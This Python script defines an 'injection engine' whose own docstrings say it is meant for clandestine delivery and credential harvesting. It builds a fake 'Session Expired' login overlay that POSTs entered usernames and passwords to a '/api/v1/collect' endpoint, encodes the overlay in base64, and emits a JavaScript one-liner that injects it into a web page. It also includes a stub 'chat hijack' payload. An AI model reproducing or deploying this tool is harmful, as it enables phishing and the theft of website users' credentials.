import base64
import json

class InjectionEngine:
    """
    Advanced Injection Engine for Chat Payloads and Overlay Injection.
    Designed for clandestine delivery and maximum impact.
    """
    def __init__(self):
        self.overlays = {
            "login_modal": self._generate_login_overlay(),
            "chat_hijack": self._generate_chat_payload()
        }

    def _generate_login_overlay(self):
        """Generates a professional login overlay for credential harvesting."""
        html = """
        <div id='nf-overlay' style='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;display:flex;justify-content:center;align-items:center;'>
            <div style='background:#fff;padding:30px;border-radius:8px;width:350px;font-family:sans-serif;'>
                <h3>Session Expired</h3>
                <p>Please re-authenticate to continue.</p>
                <input type='text' id='nf-user' placeholder='Username' style='width:100%;margin-bottom:10px;padding:8px;'>
                <input type='password' id='nf-pass' placeholder='Password' style='width:100%;margin-bottom:10px;padding:8px;'>
                <button onclick='nf_submit()' style='width:100%;padding:10px;background:#007bff;color:#fff;border:none;border-radius:4px;'>Login</button>
            </div>
        </div>
        <script>
        function nf_submit() {
            var u = document.getElementById("nf-user").value;
            var p = document.getElementById("nf-pass").value;
            fetch("/api/v1/collect", {method:"POST", body:JSON.stringify({u:u, p:p})});
            document.getElementById("nf-overlay").remove();
        }
        </script>
        """
        return base64.b64encode(html.encode()).decode()

    def _generate_chat_payload(self):
        """Generates a payload specifically for chat interface testing."""
        payload = {
            "trigger": "onMessage",
            "action": "inject_script",
            "script": "console.log('Chat Hijack Active');"
        }
        return base64.b64encode(json.dumps(payload).encode()).decode()

    def get_injector_script(self, target_type="login_modal"):
        """Returns the JS injector for the specified overlay."""
        b64_content = self.overlays.get(target_type, "")
        return f"var div = document.createElement('div'); div.innerHTML = atob('{b64_content}'); document.body.appendChild(div);"

if __name__ == "__main__":
    engine = InjectionEngine()
    print("[+] Injection Engine Loaded")
    print(engine.get_injector_script("login_modal"))
